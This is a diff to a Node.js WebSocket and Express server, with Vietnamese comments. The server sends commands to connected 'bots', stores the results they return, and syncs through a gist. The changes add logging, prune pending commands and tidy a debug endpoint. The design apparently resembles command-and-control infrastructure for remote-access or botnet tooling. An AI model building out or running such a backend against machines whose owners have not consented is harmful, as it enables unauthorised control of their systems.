@@ -180,10 +180,11 @@ wss.on('connection', (ws, req) => {
             }
 
             // ============================================================
-            // RESULT - QUAN TRỌNG: FIX LỖI
+            // RESULT - FIXED: LƯU ĐÚNG CÁCH
             // ============================================================
             else if (data.type === 'result') {
                 console.log(`[RESULT] 📥 ${botId}: ${data.cmd_id} -> ${data.status}`);
+                console.log(`[RESULT] 📝 Result data:`, data.result ? data.result.substring(0, 100) : 'null');
                 
                 let resultData = data.result;
                 
@@ -225,7 +226,12 @@ wss.on('connection', (ws, req) => {
                     });
                     console.log(`[RESULT] ➕ Added new command: ${data.cmd_id}`);
                 }
+                
+                // XÓA KHỎI PENDING NẾU CÓ
+                DB.pending_commands = DB.pending_commands.filter(p => p.cmd_id !== data.cmd_id);
+                
                 await saveDB();
+                console.log(`[RESULT] 💾 Saved to DB. Total commands: ${DB.commands.length}`);
                 
                 // Gửi ACK cho bot
                 ws.send(JSON.stringify({ 
@@ -332,6 +338,7 @@ app.post('/api/command', auth, async (req, res) => {
         executed_at: null
     });
     await saveDB();
+    console.log(`[API] 💾 Command saved to DB. Total: ${DB.commands.length}`);
 
     // GỬI LỆNH CHO BOT
     const ws = botClients.get(bot_id);
@@ -558,6 +565,16 @@ app.get('/api/results/:cmd_id', auth, (req, res) => {
     }
     
     console.log(`[API] ❌ Command ${cmdId} not found`);
+    console.log(`[API] 📋 Total commands in DB: ${DB.commands.length}`);
+    
+    // DEBUG: In 5 command gần nhất
+    const recent = DB.commands.slice(-5);
+    console.log(`[API] 📋 Recent commands:`, recent.map(c => ({ 
+        id: c.cmd_id, 
+        cmd: c.command, 
+        status: c.status 
+    })));
+    
     res.json({
         cmd_id: cmdId,
         result: null,
@@ -648,20 +665,19 @@ app.post('/api/gist/sync', auth, async (req, res) => {
 app.get('/api/debug/command/:cmd_id', auth, (req, res) => {
     const cmdId = req.params.cmd_id;
     
+    const cmd = DB.commands.find(c => c.cmd_id === cmdId);
+    const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
+    
     const result = {
         cmd_id: cmdId,
-        in_commands: DB.commands.some(c => c.cmd_id === cmdId),
-        in_pending: DB.pending_commands.some(p => p.cmd_id === cmdId),
+        in_commands: !!cmd,
+        in_pending: !!pending,
         commands_total: DB.commands.length,
         pending_total: DB.pending_commands.length,
         bots_online: DB.bots.filter(b => b.online).length,
-        bot_connected: botClients.has(DB.commands.find(c => c.cmd_id === cmdId)?.bot_id || '')
+        command: cmd || null,
+        pending: pending || null
     };
-    
-    const cmd = DB.commands.find(c => c.cmd_id === cmdId);
-    if (cmd) {
-        result.command = cmd;
-    }
     
     res.json(result);
 });
